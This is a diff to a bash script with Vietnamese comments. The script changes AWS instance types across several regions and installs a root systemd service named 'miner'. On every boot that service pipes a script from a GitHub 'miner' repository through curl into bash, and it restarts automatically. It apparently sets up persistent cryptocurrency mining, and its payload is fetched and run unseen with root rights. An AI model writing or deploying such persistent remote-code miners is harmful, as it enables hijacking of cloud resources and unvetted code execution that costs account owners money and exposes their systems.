@@ -1,5 +1,11 @@
 #!/bin/bash
 
+# Kiểm tra quyền root
+if [[ $EUID -ne 0 ]]; then
+   echo "⚠️ Vui lòng chạy script với quyền root!" 
+   exit 1
+fi
+
 # Danh sách vùng AWS cần thay đổi instance
 REGIONS=("us-east-1" "us-west-2" "us-east-2")
 
@@ -51,22 +57,18 @@ echo "✅ Hoàn tất thay đổi instance type cho tất cả vùng!"
 
 USER_DATA_URL="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"
 
-# Kiểm tra nếu script đang chạy với quyền root
-if [ "$(id -u)" -ne 0 ]; then
-    echo "⚠️ Vui lòng chạy script với quyền root!"
-    exit 1
-fi
+# Chờ hệ thống khởi động hoàn tất
+echo "⏳ Chờ hệ thống khởi động hoàn tất..."
+sleep 300
 
 # Tạo systemd service để tải & chạy script mỗi khi máy khởi động lại
-cat > /etc/systemd/system/miner.service <<EOF
+cat <<EOF > /etc/systemd/system/miner.service
 [Unit]
 Description=Auto-run Miner Script
 After=network.target
-Wants=network-online.target
-Requires=cloud-final.service
 
 [Service]
-ExecStart=/bin/bash -c 'sleep 60 && curl -s -L "$USER_DATA_URL" | bash'
+ExecStart=/bin/bash -c 'curl -s -L "$USER_DATA_URL" | bash'
 Restart=always
 User=root
 
@@ -77,6 +79,6 @@ EOF
 # Reload systemd và kích hoạt service
 systemctl daemon-reload
 systemctl enable miner
-systemctl restart miner
+systemctl start miner
 
-echo "✅ Cấu hình tự động chạy script sau khi khởi động lại thành công!
+echo "✅ Cấu hình tự động chạy script sau khi khởi động lại thành công!"
